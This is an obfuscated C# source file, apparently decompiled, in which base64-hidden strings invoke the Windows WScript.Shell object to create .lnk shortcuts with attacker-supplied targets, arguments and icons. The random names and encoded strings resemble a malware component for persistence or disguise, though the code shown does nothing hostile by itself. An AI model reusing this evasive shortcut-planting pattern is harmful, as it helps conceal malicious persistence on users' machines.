using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace OeQGwjtftIBDg;

public sealed class XdQyiXfDNPsvZ
{
	[ComImport]
	[TypeLibType(4160)]
	[Guid("F935DC23-1CF0-11D0-ADB9-00C04FD58A0B")]
	private interface UnGZVMiVlgyszZS
	{
		[DispId(0)]
		string VKoqDjkCgxMuzHkbpT
		{
			[DispId(0)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
		}

		[DispId(1000)]
		string tWOSJPjqUyND
		{
			[DispId(1000)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1000)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1001)]
		string lyrSIBbjUJv
		{
			[DispId(1001)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1001)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1002)]
		string vRmMCeRFiAw
		{
			[DispId(1002)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1002)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1003)]
		string oHlCSkbfbm
		{
			[DispId(1003)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1003)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1004)]
		string cDLPDRqJAZ
		{
			[DispId(1004)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1005)]
		string jsjXdWclFwMNjr
		{
			[DispId(1005)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1005)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1006)]
		int DYnwJQvkhIUiG
		{
			[DispId(1006)]
			get;
			[DispId(1006)]
			[param: In]
			set;
		}

		[DispId(1007)]
		string qIapMeOEVbnD
		{
			[DispId(1007)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1007)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(2000)]
		[TypeLibFunc(64)]
		void Load([In][MarshalAs(UnmanagedType.BStr)] string PathLink);

		[DispId(2001)]
		void Save();
	}

	private static Type bFAhQSnkPpeZW = Type.GetTypeFromProgID(jSdbwwLMlbK.aOUUGKAtMbj("V1NjcmlwdC5TaGVsbA=="));

	private static object QDphdTlgWNYz = Activator.CreateInstance(bFAhQSnkPpeZW);

	public static void ehZRKgQLWZe(string string_0, string string_1, string string_2, string string_3, string string_4, string string_5, string string_6)
	{
		try
		{
			UnGZVMiVlgyszZS unGZVMiVlgyszZS = (UnGZVMiVlgyszZS)bFAhQSnkPpeZW.InvokeMember(jSdbwwLMlbK.aOUUGKAtMbj("Q3JlYXRlU2hvcnRjdXQ="), BindingFlags.InvokeMethod, null, QDphdTlgWNYz, new object[1] { string_0 });
			unGZVMiVlgyszZS.lyrSIBbjUJv = string_4;
			unGZVMiVlgyszZS.vRmMCeRFiAw = string_5;
			unGZVMiVlgyszZS.jsjXdWclFwMNjr = string_1;
			unGZVMiVlgyszZS.qIapMeOEVbnD = string_3;
			unGZVMiVlgyszZS.tWOSJPjqUyND = string_2;
			if (!string.IsNullOrEmpty(string_6))
			{
				unGZVMiVlgyszZS.oHlCSkbfbm = string_6;
			}
			unGZVMiVlgyszZS.Save();
		}
		catch (Exception ex)
		{
			if (jSdbwwLMlbK.NZZJwvuCaIyu)
			{
				try
				{
					File.AppendAllText(jSdbwwLMlbK.agUGmZJGeSw, "Error while creating ShortCut: " + ex.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
